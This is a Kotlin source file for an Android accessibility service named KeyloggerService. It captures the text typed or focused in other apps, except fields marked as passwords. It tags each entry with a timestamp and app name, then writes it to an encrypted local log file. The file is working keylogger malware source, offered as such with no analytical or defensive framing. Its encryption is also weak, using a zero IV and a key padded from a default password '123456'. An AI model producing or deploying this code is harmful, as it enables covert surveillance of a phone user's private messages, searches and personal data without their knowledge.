package com.moje.keylogger

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import javax.crypto.spec.IvParameterSpec
import android.util.Base64

object KeyloggerService {
    var isRunning = false
}

class KeyloggerService : AccessibilityService() {
    private val df = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
    private var pass = "123456"

    override fun onServiceConnected() {
        KeyloggerService.isRunning = true
        pass = getSharedPreferences("k", MODE_PRIVATE).getString("pass", "123456")!!
    }

    override fun onAccessibilityEvent(e: AccessibilityEvent?) {
        if (!KeyloggerService.isRunning || e == null || e.isPassword) return
        if (e.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED && e.eventType != AccessibilityEvent.TYPE_VIEW_FOCUSED) return

        val app = e.packageName?.toString() ?: "nieznana"
        val text = e.text?.joinToString("") ?: return
        if (text.isBlank()) return

        val line = "[${df.format(Date())}] [$app] $text"
        File(getExternalFilesDir(null), "log.enc").appendText(encrypt(line) + "\n")
    }

    private fun encrypt(t: String): String {
        val k = pass.padEnd(32, '0').take(32).toByteArray()
        val c = Cipher.getInstance("AES/CBC/PKCS5Padding")
        c.init(Cipher.ENCRYPT_MODE, SecretKeySpec(k, "AES"), IvParameterSpec(ByteArray(16)))
        return Base64.encodeToString(c.doFinal(t.toByteArray()), Base64.DEFAULT)
    }

    override fun onInterrupt() { KeyloggerService.isRunning = false }
}

